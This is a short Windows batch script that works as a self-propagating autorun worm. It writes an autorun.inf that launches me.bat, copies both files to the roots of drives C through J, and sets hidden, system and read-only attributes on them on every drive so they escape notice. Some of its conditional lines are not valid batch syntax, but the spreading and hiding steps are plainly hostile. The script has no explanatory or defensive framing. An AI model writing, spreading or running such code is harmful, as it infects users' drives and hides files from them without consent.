echo [autorun]>>autorun.inf
echo shellexecute=me.bat>>autorun.inf
if path c:\
copy me.bat c:\
goto att
if path d:\
copy me.bat d:\
goto att
if path e:\
copy me.bat e:\
goto att
copy me.bat f:\
copy me.bat g:\
copy me.bat h:\
copy me.bat i:\
copy me.bat j:\

copy autorun.inf c:\
copy autorun.inf d:\
copy autorun.inf e:\
copy autorun.inf f:\
copy autorun.inf g:\
copy autorun.inf h:\
copy autorun.inf i:\
copy autorun.inf j:\
:att
attrib +h +s +r c:\me.bat
attrib +h +s +r d:\me.bat
attrib +h +s +r e:\me.bat
attrib +h +s +r f:\me.bat
attrib +h +s +r g:\me.bat
attrib +h +s +r h:\me.bat
attrib +h +s +r i:\me.bat
attrib +h +s +r j:\me.bat

attrib +h +s +r c:\autorun.inf
attrib +h +s +r d:\autorun.inf
attrib +h +s +r e:\autorun.inf
attrib +h +s +r f:\autorun.inf
attrib +h +s +r g:\autorun.inf
attrib +h +s +r h:\autorun.inf
attrib +h +s +r i:\autorun.inf
attrib +h +s +r j:\autorun.inf